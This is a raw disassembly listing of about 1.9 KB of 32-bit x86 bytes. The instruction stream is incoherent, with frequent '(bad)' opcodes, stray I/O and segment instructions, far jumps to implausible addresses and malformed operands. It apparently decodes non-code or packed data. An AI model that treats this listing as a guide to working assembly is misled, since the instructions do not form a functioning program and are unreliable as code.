  41481f:	sbb    DWORD PTR [edx],0x21
  414822:	cmp    eax,0x2bb56adb
  414827:	pushf  
  414828:	je     0x4147bc
  41482a:	adc    esi,edx
  41482c:	mov    edx,0x91fd7a1c
  414831:	jmp    0xff44cf59
  414836:	out    dx,eax
  414837:	rcr    BYTE PTR [ecx],0x94
  41483a:	mov    dl,0x7d
  41483c:	test   BYTE PTR [ebx+ebx*1+0x404b0deb],ah
  414843:	sbb    esi,DWORD PTR [edx+0x17]
  414846:	icebp  
  414847:	mov    dl,0x3f
  414849:	dec    esi
  41484a:	mov    dl,0x94
  41484c:	mov    ss,WORD PTR [ebx-0x6f]
  41484f:	mov    ds:0x8a0830f9,eax
  414854:	mov    cl,BYTE PTR [edi+eiz*1]
  414857:	in     eax,0xc4
  414859:	int3   
  41485a:	sub    edx,0x5daee91d
  414860:	imul   esp,DWORD PTR [edi+0x68],0x65
  414864:	jle    0x41480b
  414866:	cmp    esi,edx
  414868:	pop    ds
  414869:	iret   
  41486a:	mov    ?,ecx
  41486c:	mov    esi,0x8a810cf4
  414871:	ins    BYTE PTR es:[edi],dx
  414872:	or     eax,0xad011c95
  414877:	mov    ch,0xd5
  414879:	cdq    
  41487a:	mov    ebx,DWORD PTR [esi]
  41487c:	pop    edi
  41487d:	daa    
  41487e:	mov    eax,ds:0x383ccf0d
  414883:	jl     0x41480b
  414885:	popf   
  414886:	stos   BYTE PTR es:[edi],al
  414887:	test   DWORD PTR [ebp-0x55],esi
  41488a:	dec    ecx
  41488b:	in     eax,0x5d
  41488d:	mov    ds:0x669ca8ab,al
  414892:	jb     0x4148c5
  414894:	ret    
  414895:	push   0xffffff91
  414897:	adc    eax,0xa4bb3570
  41489c:	ja     0x4148bc
  41489e:	xchg   ecx,eax
  41489f:	sub    eax,0xa82ba423
  4148a4:	jne    0x4148d1
  4148a6:	adc    al,0x4f
  4148a8:	sti    
  4148a9:	cld    
  4148aa:	and    al,BYTE PTR [eax+0x69]
  4148ad:	pushf  
  4148ae:	cmp    DWORD PTR [esi-0xd],0xffffff81
  4148b2:	mov    edi,0x7ba1d11b
  4148b7:	scas   al,BYTE PTR es:[edi]
  4148b8:	mov    dh,0x1c
  4148ba:	push   ebx
  4148bb:	fcomi  st,st(4)
  4148bd:	mov    ecx,0x27e2f67a
  4148c2:	mov    cl,0x64
  4148c4:	es push edi
  4148c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148c7:	lea    edx,[ebp+0x76ed0fe8]
  4148cd:	mov    al,0x12
  4148cf:	scas   al,BYTE PTR es:[edi]
  4148d0:	and    ebp,DWORD PTR [ecx-0x59]
  4148d3:	arpl   WORD PTR [edi-0x68ec75c6],dx
  4148d9:	fwait
  4148da:	or     esi,ecx
  4148dc:	retf   0x8d31
  4148df:	enter  0xf384,0x21
  4148e3:	(bad)  
  4148e4:	fsub   QWORD PTR [ecx+0x72]
  4148e7:	addr16 sub al,0x81
  4148ea:	and    al,0x85
  4148ec:	xor    edx,edi
  4148ee:	mov    eax,0xeb9dd060
  4148f3:	repz xchg edx,eax
  4148f5:	inc    ebx
  4148f6:	(bad)  
  4148f7:	fdiv   DWORD PTR [eax+esi*2+0x3a]
  4148fb:	(bad)  
  4148fc:	mov    ebp,0x8544b57a
  414901:	mov    esi,0xd1d6c0db
  414906:	dec    ebp
  414907:	(bad)  [eax]
  414909:	sub    BYTE PTR [ebp-0x6b],ch
  41490c:	jns    0x414938
  41490e:	mov    ah,0xc
  414910:	or     eax,0xa5a6907a
  414915:	mov    ds:0x80d2d1c1,eax
  41491a:	and    DWORD PTR [eax+0x5],edx
  41491d:	rcr    ebx,cl
  41491f:	in     eax,dx
  414920:	jne    0x41496d
  414922:	pop    ds
  414923:	xor    al,0x57
  414925:	(bad)  
  414926:	xlat   BYTE PTR ds:[ebx]
  414927:	pop    esi
  414928:	(bad)  
  414929:	(bad)  
  41492a:	mov    ecx,0x66316d84
  41492f:	vpsllq xmm5,xmm4,XMMWORD PTR [ecx-0x3377307e]
  414937:	cmp    al,0x12
  414939:	pop    esi
  41493a:	dec    ebx
  41493b:	test   BYTE PTR [eax],0xca
  41493e:	das    
  41493f:	aas    
  414940:	mov    ds:0x8ee99da0,al
  414945:	jo     0x4149bf
  414947:	arpl   WORD PTR [ecx],bp
  414949:	xchg   DWORD PTR [ebp-0x46b6ee58],esp
  41494f:	int3   
  414950:	iret   
  414951:	sub    DWORD PTR ds:0x26279413,eax
  414957:	cmc    
  414958:	and    BYTE PTR [ebp+0x19],ah
  41495b:	loopne 0x41494d
  41495d:	sub    ch,0x43
  414960:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414962:	out    dx,eax
  414963:	pop    edi
  414964:	rcl    BYTE PTR [esi+edi*4],0xfd
  414968:	sbb    DWORD PTR [ecx],ecx
  41496a:	popa   
  41496b:	data16 fisttp QWORD PTR [ecx-0x669d8e56]
  414972:	mov    ebx,0x724cd4af
  414977:	sub    dh,BYTE PTR [ecx+0x17]
  41497a:	js     0x4149a3
  41497c:	jge    0x414904
  41497e:	pushf  
  41497f:	fdivr  st,st(2)
  414981:	mov    eax,ds:0xee8b9739
  414986:	xchg   esp,eax
  414987:	add    eax,0xef321275
  41498c:	and    edx,DWORD PTR [ebp-0x36df0a83]
  414992:	jno    0x4149b6
  414994:	shl    BYTE PTR [edx-0x46],cl
  414997:	(bad)  
  414999:	mov    ds,WORD PTR [ebp-0x64b4caa3]
  41499f:	ds pop esi
  4149a1:	aam    0xe0
  4149a3:	and    BYTE PTR fs:[ebx+0x36],al
  4149a7:	fistp  WORD PTR [eax]
  4149a9:	jns    0x41497d
  4149ab:	pop    ebp
  4149ac:	mov    ds,WORD PTR [eax-0x9]
  4149af:	or     BYTE PTR ds:0xdd5f0bb3,cl
  4149b5:	je     0x4149b3
  4149b7:	test   DWORD PTR [ebp+0x70ed39c],eax
  4149bd:	mov    edx,ds
  4149bf:	icebp  
  4149c0:	imul   ecx,DWORD PTR [ebx+edx*2-0x53],0x5
  4149c5:	inc    ebx
  4149c6:	loopne 0x4149ba
  4149c8:	repz jnp 0x414a30
  4149cb:	dec    ebx
  4149cc:	jne    0x41499e
  4149ce:	(bad)  
  4149cf:	pop    ebp
  4149d0:	call   0xa3ca:0xd014b48d
  4149d7:	cmp    DWORD PTR [ecx],ebp
  4149d9:	sti    
  4149da:	sub    eax,0xb6e90dc3
  4149df:	jl     0x4149ff
  4149e1:	fdivr  DWORD PTR [ebp+0x4]
  4149e4:	ss call 0x70d56ea9
  4149ea:	add    DWORD PTR [esi],ecx
  4149ec:	out    0x74,al
  4149ee:	jg     0x414a0b
  4149f0:	fstp   DWORD PTR [ebp-0x4a]
  4149f3:	popa   
  4149f4:	push   ds
  4149f5:	pop    esi
  4149f6:	cmp    eax,0xbbba00e1
  4149fb:	aam    0xf1
  4149fd:	cdq    
  4149fe:	mov    cl,0x38
  414a00:	xchg   esi,eax
  414a01:	jecxz  0x414990
  414a03:	int3   
  414a04:	pop    ds
  414a05:	mov    ecx,0x569d316d
  414a0a:	and    al,0x11
  414a0c:	mov    edx,0xf8269bb8
  414a11:	jb     0x4149c3
  414a13:	loopne 0x414a52
  414a15:	xchg   ebp,eax
  414a16:	outs   dx,DWORD PTR ds:[esi]
  414a17:	jae    0x4149a7
  414a19:	and    DWORD PTR [eax+0x6a9943bf],ecx
  414a1f:	out    0xa,eax
  414a21:	mov    eax,ds:0x488beec5
  414a26:	sub    eax,DWORD PTR ds:0x62c27c1a
  414a2c:	fbld   TBYTE PTR [edx+0x7a409d5b]
  414a32:	push   eax
  414a33:	dec    edx
  414a34:	mov    ds:0x67cd4885,eax
  414a39:	jnp    0x4149f5
  414a3b:	(bad)  
  414a3c:	out    dx,eax
  414a3d:	cld    
  414a3e:	push   cs
  414a3f:	sub    al,BYTE PTR [ebp-0x61]
  414a42:	pop    esp
  414a43:	out    dx,eax
  414a44:	rcr    BYTE PTR [edi-0x7f],cl
  414a47:	cmp    ah,BYTE PTR [ecx+ecx*4]
  414a4a:	jg     0x414a23
  414a4c:	in     al,dx
  414a4d:	inc    edx
  414a4e:	inc    ecx
  414a4f:	call   0xbf3d10b7
  414a54:	and    edi,ecx
  414a56:	outs   dx,DWORD PTR ds:[esi]
  414a57:	test   al,0x20
  414a59:	mov    ch,0x4b
  414a5b:	xchg   edi,eax
  414a5c:	xor    BYTE PTR [ecx+0x6f4f37b1],bh
  414a62:	fimul  WORD PTR [ecx-0x4e2c6967]
  414a68:	inc    ebp
  414a69:	call   0x35293e63
  414a6e:	(bad)  
  414a71:	jp     0x414a1b
  414a73:	ins    DWORD PTR es:[edi],dx
  414a74:	sbb    ah,cl
  414a76:	mov    bh,0xeb
  414a78:	jnp    0x414ad6
  414a7a:	(bad)
  414a7e:	pop    ebp
  414a7f:	out    dx,eax
  414a80:	mov    ebp,0x66938ace
  414a85:	stc    
  414a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a87:	daa    
  414a88:	int3   
  414a89:	pushf  
  414a8a:	dec    ebp
  414a8b:	das    
  414a8c:	aaa    
  414a8d:	in     al,0xb8
  414a8f:	lock aad 0x5c
  414a92:	adc    al,0xee
  414a94:	jb     0x414a4a
  414a96:	xchg   ecx,eax
  414a97:	retf   
  414a98:	pop    ss
  414a99:	sub    DWORD PTR [ebp+ecx*1-0x2f],edx
  414a9d:	push   ebx
  414a9e:	mov    ds:0x3ba29cd5,al
  414aa3:	adc    ah,0x4b
  414aa6:	adc    ecx,DWORD PTR [eax+0x3066993a]
  414aac:	push   eax
  414aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aae:	mov    bl,0x34
  414ab0:	sbb    al,0xb6
  414ab2:	add    eax,0x7c7685fd
  414ab7:	repz fstp QWORD PTR [ebx]
  414aba:	jle    0x414a85
  414abc:	sbb    ebp,ecx
  414abe:	imul   esi,esi,0x479b6b0a
  414ac4:	shl    DWORD PTR [eax+0x584bc74b],cl
  414aca:	mov    dl,0xe9
  414acc:	jmp    0x7b9e:0xad223f7e
  414ad3:	fldl2e 
  414ad5:	clc    
  414ad6:	popa   
  414ad7:	mov    fs,WORD PTR [ebp+0x7f]
  414ada:	int    0x37
  414adc:	out    dx,al
  414add:	lahf   
  414ade:	ja     0x414ab6
  414ae0:	call   0x4589:0x1b661787
  414ae7:	and    al,0x87
  414ae9:	pop    edi
  414aea:	push   esp
  414aeb:	mov    esp,DWORD PTR [eax-0x70]
  414aee:	scas   eax,DWORD PTR es:[edi]
  414aef:	sub    BYTE PTR [esi],bl
  414af1:	leave  
  414af2:	in     eax,0xbc
  414af4:	jmp    0x25b3db6c
  414af9:	pop    ecx
  414afa:	pop    ds
  414afb:	cmovl  esp,edx
  414afe:	adc    al,0x14
  414b00:	(bad)  
  414b01:	pop    eax
  414b02:	(bad)  
  414b03:	mov    ds,WORD PTR [esi]
  414b05:	mov    cl,0x17
  414b07:	popa   
  414b08:	loopne 0x414a9a
  414b0a:	mov    edx,0x1d691630
  414b0f:	in     eax,dx
  414b10:	sar    BYTE PTR [eax-0xc],0xbc
  414b14:	adc    DWORD PTR [edi+0x33c20c1b],ebx
  414b1a:	xchg   edx,eax
  414b1b:	jne    0x414abf
  414b1d:	inc    esp
  414b1e:	pop    ecx
  414b1f:	es and al,0x81
  414b22:	mov    bl,0x64
  414b24:	pop    ebp
  414b25:	idiv   BYTE PTR [eax-0x6ca31905]
  414b2b:	fstp   DWORD PTR [edi]
  414b2d:	dec    edi
  414b2e:	push   ebp
  414b2f:	clc    
  414b30:	test   al,0x42
  414b32:	push   es
  414b33:	mov    ebp,0xe4b80aba
  414b38:	in     eax,0x5b
  414b3a:	inc    ecx
  414b3b:	ret    
  414b3c:	lds    ebx,FWORD PTR [edx]
  414b3e:	mov    dl,0xe6
  414b40:	adc    al,0x62
  414b42:	leave  
  414b43:	pop    edx
  414b44:	gs fwait
  414b46:	mov    esi,0xad292342
  414b4b:	or     eax,DWORD PTR [ecx]
  414b4d:	jg     0x414b36
  414b4f:	push   0xee792dc5
  414b54:	outs   dx,BYTE PTR ds:[esi]
  414b55:	xchg   edx,eax
  414b56:	mov    al,ds:0x13a9216f
  414b5b:	sti    
  414b5c:	sub    BYTE PTR [ebp-0x1b],bh
  414b5f:	cli    
  414b60:	add    eax,0xb554fb9e
  414b65:	mov    dh,0x1
  414b67:	sub    edx,DWORD PTR [edi+0x11]
  414b6a:	push   ebx
  414b6b:	(bad)  
  414b6c:	lods   al,BYTE PTR ds:[esi]
  414b6d:	addr16 mov ebx,0x854f5024
  414b73:	enter  0xad16,0x25
  414b77:	pusha  
  414b78:	adc    eax,0xbce46f9b
  414b7d:	push   ebp
  414b7e:	add    DWORD PTR [edi+0x18],esp
  414b81:	and    bl,bh
  414b83:	and    ah,BYTE PTR [ecx+ebp*4]
  414b86:	adc    esi,DWORD PTR [eax+esi*1-0x1e]
  414b8a:	pop    es
  414b8b:	mov    esi,0x918ba6e5
  414b90:	not    dl
  414b92:	out    dx,eax
  414b93:	ret    0xcf6e
  414b96:	mov    ah,0xf2
  414b98:	add    ah,dh
  414b9a:	mov    edi,0xd348f14
  414b9f:	mov    WORD PTR [esi],?
  414ba1:	sbb    dl,dl
  414ba3:	sbb    al,0x0
  414ba5:	or     DWORD PTR [ebx-0x13],0xbccafd30
  414bac:	ret    
  414bad:	retf   0x1ab8
  414bb0:	mov    ds:0x26f4bf82,al
  414bb5:	xor    eax,ecx
  414bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb8:	mul    BYTE PTR [ebx+ebx*8]
  414bbb:	jne    0x414c10
  414bbd:	sbb    DWORD PTR [edi-0x7c37625e],ebp
  414bc3:	sbb    al,0x16
  414bc5:	fnstenv [eax+0x54]
  414bc8:	ins    DWORD PTR es:[edi],dx
  414bc9:	sbb    ah,BYTE PTR [ecx+0x49]
  414bcc:	in     eax,dx
  414bcd:	push   ebp
  414bce:	out    dx,eax
  414bcf:	fs pop ss
  414bd1:	sub    eax,esp
  414bd3:	jmp    0xc78bfacf
  414bd8:	sbb    DWORD PTR [ecx],edi
  414bda:	(bad)  
  414bdb:	mov    edx,0x59766b5f
  414be0:	adc    ebx,DWORD PTR [ebx+ebp*2+0x703f1dae]
  414be7:	cmp    al,BYTE PTR [ebp+0x2f]
  414bea:	xor    DWORD PTR [edi],ebp
  414bec:	sbb    eax,0x100c0659
  414bf1:	dec    ebx
  414bf2:	mov    BYTE PTR [ecx+0x38],bl
  414bf5:	mov    es,WORD PTR [ebx]
  414bf7:	adc    ch,dl
  414bf9:	dec    edx
  414bfa:	xor    ebx,0xf2a6ab6d
  414c00:	sbb    ebx,DWORD PTR [ecx]
  414c02:	push   ebp
  414c03:	mov    eax,DWORD PTR [edi]
  414c05:	out    dx,eax
  414c06:	hlt    
  414c07:	cmp    eax,0x709ba393
  414c0c:	inc    ecx
  414c0d:	or     DWORD PTR [ecx+0x76b1d442],ecx
  414c13:	loope  0x414bfb
  414c15:	test   cl,ah
  414c17:	fs jns 0x414c3e
  414c1a:	sbb    ah,dh
  414c1c:	add    ah,BYTE PTR [eax+0x1547023b]
  414c22:	sub    al,0x9d
  414c24:	sub    dl,BYTE PTR [esi+0x50c87fe4]
  414c2a:	mov    al,0xe4
  414c2c:	or     esp,DWORD PTR [edi+0x5a]
  414c2f:	xor    esi,eax
  414c31:	or     edx,DWORD PTR gs:[esi-0xe]
  414c35:	cdq    
  414c36:	jecxz  0x414c22
  414c38:	push   cs
  414c39:	or     al,0x95
  414c3b:	daa    
  414c3c:	cmp    al,0xf7
  414c3e:	dec    esi
  414c3f:	xchg   ebp,eax
  414c40:	jge    0x414bf2
  414c42:	xchg   esi,eax
  414c43:	out    dx,al
  414c44:	sbb    esi,DWORD PTR [eax+0x63e1b96b]
  414c4a:	cmp    BYTE PTR [edx],ch
  414c4c:	(bad)  
  414c4d:	sbb    ch,BYTE PTR [ecx]
  414c4f:	retf   
  414c50:	inc    esi
  414c51:	test   eax,0x9bd1ef85
  414c56:	(bad)  
  414c57:	fcom   st(4)
  414c59:	gs (bad) 
  414c5b:	out    0x6c,al
  414c5d:	mov    bl,ah
  414c5f:	cli    
  414c60:	scas   eax,DWORD PTR es:[edi]
  414c61:	pop    edx
  414c62:	mov    bl,0x6e
  414c64:	mov    ah,0xd0
  414c66:	mov    bh,0xd8
  414c68:	pop    es
  414c69:	sbb    dh,BYTE PTR [edx-0x3e5d9556]
  414c6f:	fdivr  st,st(6)
  414c71:	aam    0x41
  414c73:	inc    eax
  414c74:	in     eax,0x2
  414c76:	pop    esp
  414c77:	call   0x3fa5a676
  414c7c:	and    ecx,edi
  414c7e:	enter  0x5f34,0xa2
  414c82:	call   0xbe80:0xbbb883ee
  414c89:	adc    al,0x57
  414c8b:	repz jo 0x414c34
  414c8e:	outs   dx,BYTE PTR ds:[esi]
  414c90:	in     eax,dx
  414c91:	pop    edx
  414c92:	cli    
  414c93:	bound  ebx,QWORD PTR [ebx]
  414c95:	add    eax,0x33dabfa5
  414c9a:	(bad)  
  414c9b:	addr16 and eax,0xbced217c
  414ca1:	adc    ch,BYTE PTR [esi-0x42]
  414ca4:	mov    dl,0x49
  414ca6:	ins    BYTE PTR es:[edi],dx
  414ca7:	xchg   DWORD PTR [edx-0x58],ecx
  414caa:	or     ecx,DWORD PTR [edx+eiz*4-0x38]
  414cae:	or     eax,0xcb9ccd7a
  414cb3:	and    BYTE PTR ds:0xb30bcc,ah
  414cb9:	in     al,dx
  414cba:	(bad)  [eax]
  414cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cbd:	int3   
  414cbe:	mov    edi,0x2dfd76b4
  414cc3:	test   DWORD PTR [ebp-0x903c85b],esp
  414cc9:	mov    gs,WORD PTR [eax]
  414ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ccc:	add    dh,BYTE PTR [ebx-0x7a72d522]
  414cd2:	(bad)  
  414cd3:	sbb    ch,bl
  414cd5:	sbb    eax,0xbaefefb2
  414cda:	retf   
  414cdb:	aam    0xf5
  414cdd:	loopne 0x414d37
  414cdf:	in     al,dx
  414ce0:	push   eax
  414ce1:	inc    edi
  414ce2:	call   0x645e0515
  414ce7:	lock xchg edi,eax
  414ce9:	pushf  
  414cea:	push   0xbebef755
  414cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cf0:	cli    
  414cf1:	fwait
  414cf2:	sbb    eax,edx
  414cf4:	inc    esi
  414cf5:	in     eax,0x37
  414cf7:	ss or  eax,0xa1e53665
  414cfd:	inc    esi
  414cfe:	mov    ecx,0xce66da14
  414d03:	jo     0x414caa
  414d05:	mov    al,0x80
  414d07:	out    dx,eax
  414d08:	addr16 or eax,0x192538b7
  414d0e:	sub    al,0x5c
  414d10:	in     eax,0x12
  414d12:	cmp    eax,0xbba7bdcc
  414d17:	or     ah,BYTE PTR [ecx]
  414d19:	sub    al,BYTE PTR [ebx]
  414d1b:	dec    esp
  414d1c:	push   DWORD PTR [ebx-0x565de703]
  414d22:	mov    dh,0x54
  414d24:	pop    ss
  414d25:	and    al,BYTE PTR [ebx-0x144f601b]
  414d2b:	lock call DWORD PTR fs:[ebx-0x5c]
  414d30:	xor    DWORD PTR [ebx+0x10491702],ebx
  414d36:	sbb    eax,0xbc8bf63d
  414d3b:	push   esp
  414d3c:	stos   DWORD PTR es:[edi],eax
  414d3d:	push   edx
  414d3e:	ror    BYTE PTR [ecx-0x15d7c15b],0x34
  414d45:	sbb    dl,bl
  414d47:	push   es
  414d48:	adc    ch,ch
  414d4a:	cmp    al,0x75
  414d4c:	sub    eax,0xf3f6eb07
  414d51:	sahf   
  414d52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d53:	inc    ebp
  414d54:	or     ah,BYTE PTR [edx+0x531ee3bb]
  414d5a:	inc    ebp
  414d5b:	ret    
  414d5c:	(bad)  [eax-0x12]
  414d5f:	xchg   DWORD PTR [esi+0x1ae4b3b9],eax
  414d65:	cmp    ax,0xe552
  414d69:	and    eax,0x855ef963
  414d6e:	cmc    
  414d6f:	jl     0x414dc3
  414d71:	add    ch,BYTE PTR [edx]
  414d73:	sub    DWORD PTR [edi-0x7578e928],edx
  414d79:	and    BYTE PTR [ebp+0x2a2024f4],bh
  414d7f:	aam    0xa5
  414d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d82:	(bad)  
  414d83:	jmp    0x414da4
  414d85:	cli    
  414d86:	cmp    dl,BYTE PTR [eax+0x18]
  414d89:	sub    DWORD PTR [ecx-0x62],edx
  414d8c:	outs   dx,BYTE PTR ds:[esi]
  414d8d:	hlt    
  414d8e:	sub    al,0xdf
  414d90:	and    BYTE PTR [ebx-0x3],bl
  414d93:	mov    al,ds:0x6473a0f9
  414d98:	out    dx,al
  414d99:	and    DWORD PTR [esp+ecx*8-0x7b0846de],ecx
  414da0:	test   al,0xf2
  414da2:	shl    DWORD PTR [edx-0x56a3f2be],cl
  414da8:	cmp    al,0xf2
  414daa:	ss (bad) 
  414dac:	fcomp  QWORD PTR ds:0xa740e7cd
  414db2:	pop    eax
  414db3:	out    dx,al
  414db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414db5:	iret   
  414db6:	mov    esp,0xa391c5d4
  414dbb:	sub    DWORD PTR ds:0x5a6e8b9d,0xb50f13fb
  414dc5:	mov    esp,0xdb345790
  414dca:	mov    esi,0x1bd14704
  414dcf:	jo     0x414d5a
  414dd1:	sub    DWORD PTR [edx],0xb3b15bb1
  414dd7:	pop    esp
  414dd8:	(bad)  
  414dd9:	dec    esp
  414dda:	and    DWORD PTR [edi],edx
  414ddc:	jl     0x414e38
  414dde:	fsubrp st(3),st
  414de0:	in     al,0x54
  414de2:	lock sbb eax,0x54b82024
  414de8:	pop    esi
  414de9:	cmc    
  414dea:	lods   al,BYTE PTR ds:[esi]
  414deb:	mov    al,0x2d
  414ded:	ret    
  414dee:	mov    ah,0x74
  414df0:	inc    ebp
  414df1:	sbb    eax,DWORD PTR [edx-0x65]
  414df4:	xor    eax,0x32e7aa89
  414df9:	or     DWORD PTR ds:0x3da9c6c4,ecx
  414dff:	std    
  414e00:	ret    
  414e01:	fwait
  414e02:	inc    ebx
  414e03:	cwde   
  414e04:	push   ss
  414e05:	pop    edx
  414e06:	push   ebx
  414e07:	test   DWORD PTR [ebp-0x690d731b],esi
  414e0d:	sub    eax,0x89abbfea
  414e12:	es int 0xb5
  414e15:	mov    eax,ds:0xa819d293
  414e1a:	inc    ebp
  414e1b:	jmp    0xff39:0xe13de127
  414e22:	adc    bl,dh
  414e24:	daa    
  414e25:	fisubr WORD PTR [eax+0x61]
  414e28:	xchg   edi,eax
  414e29:	bound  esi,QWORD PTR [ebx+0x4b07a604]
  414e2f:	dec    esp
  414e30:	gs stc 
  414e32:	enter  0x20f3,0x57
  414e36:	and    DWORD PTR [ebx-0x7cc196dd],ecx
  414e3c:	test   eax,0x32e5b61e
  414e41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e42:	jnp    0x414def
  414e44:	shl    DWORD PTR [edi],1
  414e46:	ins    BYTE PTR es:[edi],dx
  414e47:	mov    esp,0x20a6c83f
  414e4c:	pop    ds
  414e4d:	sub    al,0xbe
  414e4f:	inc    esp
  414e50:	repnz aaa 
  414e52:	lods   eax,DWORD PTR ds:[esi]
  414e53:	pop    esi
  414e54:	push   ebp
  414e55:	adc    BYTE PTR [edx],ch
  414e57:	out    dx,al
  414e58:	test   DWORD PTR [esi+0x594517e8],ebx
  414e5e:	mov    eax,0x6e55c1ce
  414e63:	mov    ds:0xe85cb2ab,al
  414e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e69:	jbe    0x414ea8
  414e6b:	and    BYTE PTR [ebx],dl
  414e6d:	in     eax,0x87
  414e6f:	pop    ds
  414e70:	sub    BYTE PTR [edi+0x1d581faa],dl
  414e76:	mov    edi,0xa7c87181
  414e7b:	and    eax,0xfdbf9907
  414e80:	sbb    dl,BYTE PTR [edi+0x2bc9a457]
  414e86:	ins    DWORD PTR es:[edi],dx
  414e87:	xchg   esp,eax
  414e88:	das    
  414e89:	icebp  
  414e8a:	mov    esp,0xd2143674
  414e8f:	dec    ebp
  414e90:	mov    edi,0x3ed4b03e
  414e95:	mov    dh,0xc5
  414e97:	in     eax,0xc5
  414e99:	cmp    edi,DWORD PTR [ebx-0x14]
  414e9c:	push   ecx
  414e9d:	ds adc al,0x1
  414ea0:	jo     0x414e92
  414ea2:	ror    BYTE PTR [ebp-0x32],cl
  414ea5:	and    dh,BYTE PTR [edi-0x4bec4bc2]
  414eab:	les    esi,FWORD PTR [ebp+0x19]
  414eae:	cmp    BYTE PTR [esi],bl
  414eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eb1:	mov    dl,0x5d
  414eb3:	lock sbb BYTE PTR [ebx+0x5b],dl
  414eb7:	fimul  WORD PTR gs:[edx+0x76]
  414ebb:	cmp    BYTE PTR [ecx],ah
  414ebd:	inc    ebp
  414ebe:	sbb    ebx,edx
  414ec0:	test   al,0xac
  414ec2:	sub    BYTE PTR [ecx-0x1494005b],ah
  414ec8:	das    
  414ec9:	add    BYTE PTR [ebx],0x91
  414ecc:	and    DWORD PTR [ecx-0x6d919c4b],ebx
  414ed2:	cs and al,0xbe
  414ed5:	dec    esi
  414ed6:	sub    al,0xba
  414ed8:	test   DWORD PTR [ebp+0x24fd78f],0xe7b3a4e5
  414ee2:	ds sahf 
  414ee4:	and    al,0x9
  414ee6:	and    al,0xec
  414ee8:	xchg   esi,eax
  414ee9:	mov    ch,dl
  414eeb:	out    0x1b,eax
  414eed:	mov    eax,ds:0xf9fb178b
  414ef2:	call   0xf53b:0xb54b7b03
  414ef9:	mov    bh,0xb7
  414efb:	adc    al,0x87
  414efd:	iret   
  414efe:	add    DWORD PTR [eax],ecx
  414f00:	(bad)  
  414f01:	ror    DWORD PTR [ebx-0x48],cl
  414f04:	into   
  414f05:	push   ecx
  414f06:	popa   
  414f07:	aas    
  414f08:	sbb    BYTE PTR [edi],dh
  414f0a:	scas   al,BYTE PTR es:[edi]
  414f0b:	sbb    eax,0x40221933
  414f10:	push   ebx
  414f11:	jp     0x414ece
  414f13:	outs   dx,BYTE PTR ds:[esi]
  414f14:	sbb    DWORD PTR [ebp+0x68],ebx
  414f17:	test   BYTE PTR [edi+0x6c840ba0],ah
  414f1d:	inc    ecx
  414f1e:	sbb    eax,0x529d465c
  414f23:	jmp    0x414f48
  414f25:	out    0xbe,al
  414f27:	test   BYTE PTR [ebx],bh
  414f29:	lea    eax,[edx]
  414f2b:	outs   dx,DWORD PTR ds:[esi]
  414f2c:	push   esi
  414f2d:	loope  0x414f91
  414f2f:	pop    edx
  414f30:	jle    0x414ed8
  414f32:	retf   0xd0ca
  414f35:	ins    BYTE PTR es:[edi],dx
  414f36:	lea    edx,[ecx-0x20]
  414f39:	out    0xbd,eax
  414f3b:	add    al,0x76
  414f3d:	inc    esp
  414f3e:	pop    esi
  414f3f:	mov    ds:0xfe048a85,eax
  414f44:	dec    esi
  414f45:	js     0x414fba
  414f47:	into   
  414f48:	in     al,0x50
  414f4a:	fucomi st,st(7)
  414f4c:	xor    edi,DWORD PTR [edx+esi*4-0x3c]
  414f50:	bound  ebx,QWORD PTR [eax-0x62a21c2]
  414f56:	jmp    0xf952bc59
  414f5b:	loope  0x414f95
  414f5d:	mov    WORD PTR [eax],fs
  414f5f:	jmp    0x414f1d
  414f61:	(bad)  
  414f62:	mov    bl,0x14
  414f64:	jnp    0x414f12
  414f66:	in     al,0x77
  414f68:	(bad)  
  414f69:	jmp    0x74df5d59
  414f6e:	loope  0x414fd9
  414f70:	sbb    DWORD PTR [eax-0x11],ebx
  414f73:	mov    BYTE PTR [esi],bl
  414f75:	or     DWORD PTR [ebp+0x33],edi
  414f78:	mov    esi,0x3be1b24a
  414f7d:	je     0x414fd2
  414f7f:	sub    BYTE PTR [ebp+0x10f13600],dh
  414f85:	xlat   BYTE PTR ds:[ebx]
  414f86:	dec    esp
  414f87:	ret    0xf923
  414f8a:	xchg   edi,eax
  414f8b:	out    dx,eax
  414f8c:	mov    BYTE PTR es:[edi+eiz*2],bh
  414f90:	cmp    DWORD PTR [esi],0x4265c7cb
  414f96:	sub    eax,ebp
  414f98:	jl     0x415000
  414f9a:	outs   dx,BYTE PTR ds:[esi]
  414f9b:	pop    esp
  414f9c:	sbb    DWORD PTR [ecx-0x6de22094],ebp
  414fa2:	add    eax,0x9c8bc9ef
  414fa7:	repz jecxz 0x414f7e
  414faa:	xor    DWORD PTR ds:0xc92ba14b,0xe9a7bf9c
  414fb4:	mov    ecx,0x5b94bfd3
  414fb9:	fidiv  DWORD PTR [esi+edi*8+0x65]
  414fbd:	cli    
  414fbe:	ins    BYTE PTR es:[edi],dx
  414fbf:	stc    
  414fc0:	jne    0x414f47
  414fc2:	addr16 jg 0x414f47
  414fc5:	test   al,0xb3
  414fc7:	imul   edx,edi,0x4e84bda4
  414fcd:	mov    dh,0x9f
  414fcf:	ja     0x41501a
  414fd1:	int    0x2c
  414fd3:	addr16 jmp 0xa998:0x2f568fa4
  414fdb:	add    eax,0x277c923
  414fe0:	in     eax,dx
  414fe1:	cwde   
  414fe2:	inc    ebp
  414fe3:	push   ecx
  414fe4:	rcr    BYTE PTR [ecx-0x522dada5],cl
  414fea:	pop    edi
  414feb:	push   ebp
  414fec:	and    ah,dh
  414fee:	(bad)  
  414fef:	fstp   QWORD PTR [ebp-0x7b]
  414ff2:	mov    edi,0xd4971554
  414ff7:	shl    DWORD PTR [edi-0xbd0f9bc],1
  414ffd:	mov    al,ds:0x36dc859b
